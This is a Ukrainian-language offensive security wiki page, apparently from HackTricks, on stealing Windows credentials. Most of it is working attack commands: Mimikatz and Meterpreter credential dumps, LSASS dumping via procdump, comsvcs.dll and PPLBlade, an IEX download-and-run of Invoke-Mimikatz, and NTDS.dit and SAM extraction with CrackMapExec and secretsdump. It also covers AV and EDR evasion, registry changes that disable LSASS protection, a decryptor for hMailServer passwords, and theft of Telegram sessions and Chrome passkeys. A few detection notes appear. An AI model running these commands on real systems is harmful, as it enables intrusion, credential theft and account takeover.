# Викрадення облікових даних Windows

{{#include ../../banners/hacktricks-training.md}}

## Облікові дані Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Дізнайтеся про інші можливості Mimikatz на** [**цій сторінці**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Дізнайтеся про деякі можливі засоби захисту облікових даних тут.**](credentials-protections.md) **Ці засоби захисту можуть не дозволити Mimikatz отримати деякі облікові дані.**

## Облікові дані в Meterpreter

Використовуйте [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **, який** я створив, щоб **шукати паролі та хеші** у системі жертви.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Обхід AV

### Procdump + Mimikatz

Оскільки **Procdump від** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**є легітимним інструментом Microsoft**, Defender його не виявляє.\
За допомогою цього інструмента можна **створити dump процесу lsass**, **завантажити dump** і **локально витягти** з нього **облікові дані**.

Також можна скористатися [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Цей процес автоматично виконується за допомогою [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Примітка**: Деякі **AV** можуть **виявляти** використання **procdump.exe для створення дампа lsass.exe** як **шкідливе**, оскільки вони **виявляють** рядки **"procdump.exe" і "lsass.exe"**. Тому **непомітніше** передати **PID** lsass.exe як **аргумент** для procdump, **замість** імені **lsass.exe**.

### Створення дампа lsass за допомогою **comsvcs.dll**

DLL із назвою **comsvcs.dll**, розташована в `C:\Windows\System32`, відповідає за **створення дампа пам’яті процесу** у разі збою. Ця DLL містить **функцію** під назвою **`MiniDumpW`**, яку можна викликати за допомогою `rundll32.exe`.\
Перші два аргументи не мають значення, але третій складається з трьох частин. Перша частина — це ідентифікатор процесу, для якого створюється дамп, друга — шлях до файлу дампа, а третя — виключно слово **full**. Інших варіантів немає.\
Після обробки цих трьох частин DLL створює файл дампа та записує в нього пам’ять указаного процесу.\
**comsvcs.dll** можна використовувати для створення дампа процесу lsass, що усуває потребу завантажувати й запускати procdump. Цей метод докладно описано за посиланням [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Для виконання використовується така команда:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Цей процес можна автоматизувати за допомогою** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Створення дампу lsass за допомогою Task Manager**

1. Клацніть правою кнопкою миші на панелі завдань і виберіть Task Manager.
2. Клацніть More details.
3. На вкладці Processes знайдіть процес «Local Security Authority Process».
4. Клацніть правою кнопкою миші на процесі «Local Security Authority Process» і виберіть «Create dump file».

### Створення дампу lsass за допомогою procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) — це підписаний Microsoft бінарний файл, що входить до набору [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Уже наявний дамп аварійного завершення роботи всієї системи або його стиснена копія в доступній теці користувача можуть містити матеріали облікових даних для офлайн-аналізу. Файли з назвами на кшталт `MEMORY.DMP` і `MEMORY.7z` — лише підказки для перевірки: з’ясуйте їхнє походження та доступність і не припускайте, що вони містять придатні до використання або актуальні облікові дані.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Dumping lsass за допомогою PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) — це інструмент для дампу захищених процесів, який підтримує обфускацію дампу пам’яті та передавання його на віддалені робочі станції без запису на диск.

**Основні функції**:

1. Обхід захисту PPL
2. Обфускація файлів дампу пам’яті для обходу механізмів Defender, що виявляють загрози за сигнатурами
3. Завантаження дампу пам’яті за допомогою методів RAW і SMB без запису на диск (безфайловий дамп)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – дамп LSASS на основі SSP без MiniDumpWriteDump

Ink Dragon використовує триетапний дампер під назвою **LalsDumper**, який ніколи не викликає `MiniDumpWriteDump`, тому EDR-хуки для цього API не спрацьовують:<sup>[[3]](#references)</sup>

1. **Завантажувач Stage 1 (`lals.exe`)** – шукає у `fdp.dll` заповнювач із 32 малих літер `d`, замінює його абсолютним шляхом до `rtu.txt`, зберігає пропатчену DLL як `nfdp.dll` і викликає `AddSecurityPackageA("nfdp","fdp")`. Це змушує **LSASS** завантажити шкідливу DLL як нового постачальника підтримки безпеки (SSP).
2. **Stage 2 усередині LSASS** – коли LSASS завантажує `nfdp.dll`, DLL читає `rtu.txt`, виконує XOR для кожного байта з `0x20` і відображає декодований блоб у пам’яті перед передаванням керування.
3. **Дампер Stage 3** – повторно реалізує логіку MiniDump за допомогою **прямих системних викликів**, визначених за хешованими назвами API (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Спеціально призначений експорт із назвою `Tom` відкриває `%TEMP%\<pid>.ddt`, записує стиснений дамп LSASS у файл і закриває дескриптор, щоб ексфільтрацію можна було виконати пізніше.

Примітки оператора:

* Зберігайте `lals.exe`, `fdp.dll`, `nfdp.dll` і `rtu.txt` в одному каталозі. На Stage 1 жорстко заданий заповнювач замінюється абсолютним шляхом до `rtu.txt`, тому розміщення файлів окремо порушить ланцюжок.
* Реєстрація відбувається через додавання `nfdp` до `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Можна самостійно додати це значення, щоб змусити LSASS повторно завантажувати SSP під час кожного запуску системи.
* Файли `%TEMP%\*.ddt` — це стиснені дампи. Розпакуйте їх локально, а потім передайте Mimikatz/Volatility для вилучення облікових даних.
* Для запуску `lals.exe` потрібні права адміністратора/SeTcb, щоб `AddSecurityPackageA` виконався успішно; після повернення виклику LSASS непомітно завантажує шахрайський SSP і виконує Stage 2.
* Видалення DLL із диска не вивантажує її з LSASS. Видаліть запис реєстру й перезапустіть LSASS (перезавантажте систему) або залиште його для довготривалого закріплення.

## CrackMapExec

### Вилучення хешів SAM

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA secrets

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Створити дамп NTDS.dit із цільового DC

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump історії паролів NTDS.dit із цільового DC

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Показати атрибут pwdLastSet для кожного облікового запису NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Викрадення SAM і SYSTEM

Ці файли мають бути **розташовані** в _C:\windows\system32\config\SAM_ і _C:\windows\system32\config\SYSTEM._ Але **їх не можна просто скопіювати звичайним способом**, оскільки вони захищені.

### З реєстру

Найпростіший спосіб викрасти ці файли — отримати їхні копії з реєстру:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Завантажте** ці файли на свою машину Kali та **витягніть хеші** за допомогою:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Тіньова копія тома

За допомогою цієї служби можна копіювати захищені файли. Для цього потрібні права адміністратора.

#### Використання vssadmin

Двійковий файл vssadmin доступний лише у версіях Windows Server.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Але ви можете зробити те саме з **Powershell**. Ось приклад того, **як скопіювати файл SAM** (використовується диск «C:», а файл зберігається в C:\users\Public), але цей спосіб можна використовувати для копіювання будь-якого захищеного файлу:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Код із книги: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Нарешті, ви також можете скористатися [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1), щоб створити копії SAM, SYSTEM і ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Облікові дані Active Directory — NTDS.dit**

Файл **NTDS.dit** відомий як серце **Active Directory**: у ньому зберігаються важливі дані про об’єкти користувачів і груп, а також членство в групах. Саме в ньому зберігаються **хеші паролів** користувачів домену. Цей файл є базою даних **Extensible Storage Engine (ESE)** і розташований за шляхом **_%SystemRoom%/NTDS/ntds.dit_**.

У цій базі даних є три основні таблиці:

- **Таблиця даних**: зберігає відомості про такі об’єкти, як користувачі та групи.
- **Таблиця зв’язків**: відстежує зв’язки, наприклад членство в групах.
- **Таблиця SD**: тут зберігаються **дескриптори безпеки** кожного об’єкта, які забезпечують безпеку та контроль доступу до збережених об’єктів.

Дослідження Christoffer Andersson на рівні бази даних докладніше описують ці таблиці та їхню поведінку в різних версіях.<sup>[[8]](#references)</sup>

Windows використовує _Ntdsa.dll_ для взаємодії з цим файлом, а сам файл використовується _lsass.exe_. Тому **частина** файлу **NTDS.dit** може міститися **в пам’яті `lsass`** (імовірно, там зберігаються останні дані, до яких зверталися, щоб підвищити продуктивність завдяки використанню **кешу**).

#### Розшифрування хешів у NTDS.dit

Хеш шифрується тричі:

1. Розшифруйте ключ шифрування паролів (**PEK**) за допомогою **BOOTKEY** і **RC4**.
2. Розшифруйте **хеш** за допомогою **PEK** і **RC4**.
3. Розшифруйте **хеш** за допомогою **DES**.

**PEK** має **однакове значення на кожному контролері домену**, але він **зашифрований** у файлі **NTDS.dit** за допомогою специфічного для контролера домену **BOOTKEY** із його куща **SYSTEM**. Тому для отримання облікових даних потрібні і **NTDS.dit**, і **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Копіювання NTDS.dit за допомогою Ntdsutil

Доступно починаючи з Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Також можна скористатися трюком із [**volume shadow copy**](#stealing-sam-and-system), щоб скопіювати файл **ntds.dit**. Пам’ятайте, що вам також знадобиться копія **файлу SYSTEM** (знову ж таки, скористайтеся трюком [**отримання його з реєстру або використання volume shadow copy**](#stealing-sam-and-system)).

### **Вилучення хешів із NTDS.dit**

Отримавши файли **NTDS.dit** і **SYSTEM**, можна скористатися такими інструментами, як _secretsdump.py_, щоб **вилучити хеші**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Також їх можна **автоматично витягти** за допомогою дійсного облікового запису адміністратора домену:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Для **великих файлів NTDS.dit** рекомендується виконувати витягування за допомогою [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Нарешті, також можна скористатися **модулем metasploit**: _post/windows/gather/credentials/domain_hashdump_ або **mimikatz** `lsadump::lsa /inject`

### **Витягування об’єктів домену з NTDS.dit до бази даних SQLite**

Об’єкти NTDS можна витягнути до бази даних SQLite за допомогою [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Витягуються не лише секрети, а й усі об’єкти з їхніми атрибутами для подальшого отримання інформації, якщо вихідний файл NTDS.dit уже отримано.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

Hive `SYSTEM` є необов’язковим, але дає змогу розшифровувати секрети (хеші NT і LM, додаткові облікові дані, як-от паролі у відкритому вигляді, ключі Kerberos або trust, історію паролів NT і LM). Серед іншої інформації витягуються такі дані: облікові записи користувачів і машин із їхніми хешами, прапорці UAC, час останнього входу та зміни пароля, описи облікових записів, імена, UPN, SPN, групи та рекурсивне членство в них, дерево організаційних підрозділів і членство в них, довірені домени із зазначенням типу, напрямку та атрибутів довіри...

## Lazagne

Завантажте бінарний файл [тут](https://github.com/AlessandroZ/LaZagne/releases). Ви можете використовувати його для вилучення облікових даних із різних програм.

```
lazagne.exe all
```

## Інші інструменти для вилучення облікових даних із SAM і LSASS

### Windows credentials Editor (WCE)

Цей інструмент можна використовувати для вилучення облікових даних із пам’яті. Завантажте його тут: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Вилучення облікових даних із файлу SAM

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Витягування облікових даних із файлу SAM

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Завантажте його звідси:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) і просто **запустіть**, щоб отримати паролі.

## Збір даних про неактивні RDP-сеанси та послаблення засобів безпеки

FinalDraft RAT від Ink Dragon містить tasker `DumpRDPHistory`, методи якого стануть у пригоді будь-якому red-teamer:<sup>[[3]](#references)</sup>

### Збір телеметрії за допомогою DumpRDPHistory

* **Вихідні цілі RDP** – обробіть кожен hive користувача за адресою `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. У кожному підрозділі зберігаються ім’я сервера, `UsernameHint` і час останнього запису. Відтворити логіку FinalDraft можна за допомогою PowerShell:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Дані про вхідні RDP-підключення** — перевірте журнал `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` на наявність подій з ID **21** (успішний вхід) і **25** (відключення), щоб визначити, хто адміністрував цю машину:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Щойно з’ясуєте, який Domain Admin регулярно підключається, зніміть дамп LSASS (за допомогою LalsDumper/Mimikatz), поки його від’єднаний сеанс ще існує. CredSSP + NTLM fallback залишає verifier і токени в LSASS, які потім можна повторно використати через SMB/WinRM, щоб отримати `NTDS.dit` або закріпитися на контролерах домену.

### Погіршення налаштувань реєстру, націлені на FinalDraft

Цей самий implant також змінює кілька ключів реєстру, щоб спростити крадіжку облікових даних:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* Встановлення `DisableRestrictedAdmin=1` примусово вмикає повторне використання облікових даних/квитків під час RDP, що дає змогу переходити між системами за схемою pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` вимикає фільтрацію токенів UAC, тож локальні адміністратори отримують необмежені токени під час мережевого входу.
* `DSRMAdminLogonBehavior=2` дає змогу адміністратору DSRM входити в систему, коли DC працює, надаючи атакувальникам ще один вбудований обліковий запис із високими привілеями.
* `RunAsPPL=0` вимикає захист LSASS PPL, спрощуючи доступ до пам’яті для dumper-ів, як-от LalsDumper.

## Облікові дані конфігурації hMailServer (після компрометації)

Перевірте точні файли конфігурації `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` і `C:\ProgramData\hMailServer\hMailServer.ini` відповідно до схеми встановлення. Читабельне непорожнє значення `[Security] AdministratorPassword=` — це хеш пароля адміністратора hMailServer; воно не свідчить про пароль адміністратора Windows. Якщо ці облікові дані відновлено, перехід до облікового запису Windows потребує окремого підтвердження повторного використання пароля та прав на вхід.

Для інсталяцій, що використовують базу даних SQL CE, окреме значення `[Database] Password=` у INI захищає базу даних. У застарілих інсталяціях це значення зашифровано Blowfish зі статичним ключем `THIS_KEY_IS_NOT_SECRET` і перестановкою байтів у 4-байтових словах. Використайте шістнадцятковий рядок з INI з цим фрагментом Python:<sup>[[2]](#references)</sup>

Спершу переконайтеся, що поточний обліковий запис може читати **і** INI, **і** відповідну базу даних SQL CE `.sdf`. Пароль з INI захищає базу даних; він відрізняється від хешів облікових записів поштових скриньок, що зберігаються в ній. Переглядайте або оновлюйте **копію** бази даних, яка використовується, а не активний файл.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Маючи пароль у відкритому вигляді, скопіюйте базу даних SQL CE, щоб уникнути блокування файлів, завантажте 32-бітний provider і за потреби оновіть його перед запитом хешів:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Стовпець `accountpassword` використовує формат хешу hMailServer (режим hashcat `1421`). Зламаний пароль поштової скриньки дає змогу перейти до облікового запису Windows лише якщо цей пароль повторно використовується локальним обліковим записом або обліковим записом домену, який має необхідні права на віддалений вхід.

## Перехоплення callback автентифікації LSA (LsaApLogonUserEx2)

Деякі інструменти перехоплюють **паролі для входу у відкритому вигляді** через callback автентифікації LSA `LsaApLogonUserEx2`. Ідея полягає в тому, щоб встановити hook або обгорнути callback пакета автентифікації, аби перехопити облікові дані **під час входу** (до хешування), а потім записати їх на диск або повернути оператору. Зазвичай це реалізується як допоміжний засіб, який впроваджується в LSA або реєструється в ньому, а потім записує кожну успішну подію інтерактивного входу або входу через мережу разом з іменем користувача, доменом і паролем.<sup>[[1]](#references)</sup>

Операційні примітки:
- Щоб завантажити допоміжний засіб у ланцюжок автентифікації, потрібні права локального адміністратора або SYSTEM.
- Перехоплені облікові дані з’являються лише під час входу (інтерактивного, через RDP, службового або мережевого — залежно від hook).

## Збережені облікові дані підключень SSMS (sqlstudio.bin)

SQL Server Management Studio (SSMS) зберігає інформацію про підключення у файлі `sqlstudio.bin` для кожного користувача. Спеціалізовані засоби для дампу можуть розібрати файл і відновити збережені облікові дані SQL. В оболонках, які повертають лише вивід команд, файл часто ексфільтрують, кодуючи його у Base64 і виводячи в stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

На боці оператора перезберіть файл і запустіть dumper локально, щоб відновити облікові дані:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Викрадення сесій браузера та cookie через Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Викрадення сесій Telegram Desktop `tdata`

Telegram Desktop зберігає дані авторизації та стан облікового запису в каталозі **`tdata`**. Скопійовану сесію можна завантажити за допомогою сумісних інструментів, щоб автентифікуватися без пароля облікового запису, доки ця авторизація залишається дійсною; якщо ввімкнено шифрування локальних даних, викрадачу також знадобиться код доступу. Тоді автентифікована сесія може розкривати дані про особу, метадані діалогів і членства, повідомлення та медіафайли, доступні для завантаження.<sup>[[10]](#references)</sup>

### Виявлення та отримання

Шукайте як встановлені, так і портативні версії; назви пакетів Microsoft Store можуть відрізнятися, тому перелічіть каталоги пакетів, що містять `TelegramMessenge`, і перевірте їхнє піддерево `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Якщо звичайне читання не вдається, а токен процесу **вже містить і має ввімкнений** `SeBackupPrivilege`, доступ із підтримкою резервного копіювання є запасним варіантом; він не надає привілей і не підвищує рівень прав процесу. `CreateFileW` із `FILE_FLAG_BACKUP_SEMANTICS` може запросити семантику резервного копіювання/відновлення та обійти перевірки безпеки файлів за наявності необхідних привілеїв токена, але сам по собі цей прапорець не обходить несумісне блокування спільного доступу.<sup>[[10]](#references)[[11]](#references)</sup>

Для файлів, заблокованих під час роботи системи, створіть/прочитайте **Volume Shadow Copy**; для файлів, доступ до яких обмежено ACL, `robocopy /B` використовує режим резервного копіювання та обходить ACL файлів і каталогів.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Імплант, що економить пропускну здатність, може спочатку надіслати лише перелік шляхів до файлів, отримати ідентифікатор знімка та список шляхів, уже збережених у C2, а потім завантажити лише відсутні файли. Тому невеликі інкрементальні передавання після рекурсивного переліку `tdata` усе одно можуть свідчити про успішне викрадення сесії.<sup>[[10]](#references)</sup>

### Виявлення та стримування

Корелюйте рекурсивний доступ до `tdata` з боку процесу, що не належить Telegram, із увімкненням `SeBackupPrivilege`, відкриттям файлів із семантикою резервного копіювання, активністю VSS або дочірнім процесом `robocopy.exe` із параметром `/B`. Також шукайте швидкий перелік вмісту `%APPDATA%` і `%LOCALAPPDATA%\Packages`, після якого той самий процес встановлює вихідні з’єднання. Після компрометації скористайтеся **Налаштування → Пристрої** (або **Конфіденційність і безпека → Активні сеанси**), щоб завершити невідомі сеанси; саме лише ввімкнення двоетапної перевірки не відкликає вже викрадену авторизацію.<sup>[[10]](#references)[[13]](#references)</sup>

## Викрадення облікових даних Passkeys / WebAuthn із Chrome у Windows

Якщо вдалося отримати виконання коду від імені **користувача-жертви** на хості Windows, де використовуються **Chrome + синхронізовані Passkeys у Google Password Manager**, Passkeys стають цікавою ціллю для post-exploitation навіть **без прав адміністратора/SYSTEM**.<sup>[[4]](#references)</sup>

### Цікаві локальні артефакти

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** зберігає записи **`WebauthnCredentialSpecifics`**, закодовані у форматі protobuf. Процес від імені того самого користувача може перелічити **RP ID**, **ім’я користувача**, **ID облікових даних** і зашифровані дані приватного ключа для синхронізованих passkeys.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** зберігає локальний стан реєстрації пристрою, як-от **`wrapped_identity_private_key`** і загорнутий секрет, який використовується для відновлення синхронізованих облікових даних.<sup>[[4]](#references)</sup>

Швидкий первинний аналіз:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM-прив’язаний ключовий blob усе ще можна зловживати як локальним оракулом підписування

Якщо браузер експортує ключ ідентифікації на основі TPM як **`NCRYPT_OPAQUE_KEY_BLOB`** і зберігає цей blob у стані, доступному користувачеві, шкідливому ПЗ **не** потрібно витягувати необроблений приватний ключ. Воно може просто повторно імпортувати blob на **тій самій машині** й попросити локальний TPM підписати дані, контрольовані зловмисником:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Це означає, що **апаратна прив’язка запобігає експорту за межі пристрою, але не використанню тим самим користувачем на скомпрометованій кінцевій точці**.

### Практичні шляхи зловживання

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - Перелічіть `WebauthnCredentialSpecifics` у Chrome LevelDB.
   - Почніть вхід за допомогою passkey й отримайте новий виклик WebAuthn.
   - Використайте викрадений blob `wrapped_identity_private_key` на TPM жертви, щоб підписати прив’язку запиту cloud-authenticator.
   - Передайте отриману assertion стороні, що покладається на автентифікацію.
   - Це особливо цінно, коли RP приймає `userVerification=preferred` або не відхиляє assertion із **`UV=0`**.
2. **Перехоплення pending UV-key**<sup>[[4]](#references)</sup>
   - Примусово запустіть повторне підключення, видаливши `passkey_enclave_state` або надіславши коректну підписану операцію `device/forget`.
   - Якщо після реєстрації пристрій має стан **`uv_key_pending`**, зареєструйте контрольований зловмисником відкритий UV-ключ.
   - Якщо провайдер не перевіряє attestation / походження нового UV-ключа із захищеного апаратного забезпечення, подальші підписи ключем зловмисника вважатимуться такими, що мають **`UV=1`**.
3. **Викрадення секрету master-secret / відновлення SDS**<sup>[[4]](#references)</sup>
   - Примусово запустіть відновлення або повторне приєднання, щоб Chrome завантажив синхронізований master secret passkey.
   - Відстежуйте створення чи зміну `passkey_enclave_state`, а потім зніміть дамп пам’яті Chrome, поки там зберігається відкритий текст **секрету домену безпеки (SDS)**.
   - Використайте відновлений SDS для розшифрування зашифрованих полів у кожному записі `WebauthnCredentialSpecifics` і відновлення переносних приватних ключів WebAuthn.

### Ідеї DFIR / виявлення

- Відстежуйте **видалення/повторне створення** `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Створюйте сповіщення про аномальний доступ до Chrome **`Sync Data\LevelDB`** з боку процесів, що не є браузерами.
- Створюйте сповіщення про **дампи пам’яті Chrome** або підозрілий доступ до пам’яті іншого процесу.
- Перевіряйте випадки повторних запитів **PIN-коду відновлення Google Password Manager** або неочікуваної повторної реєстрації.
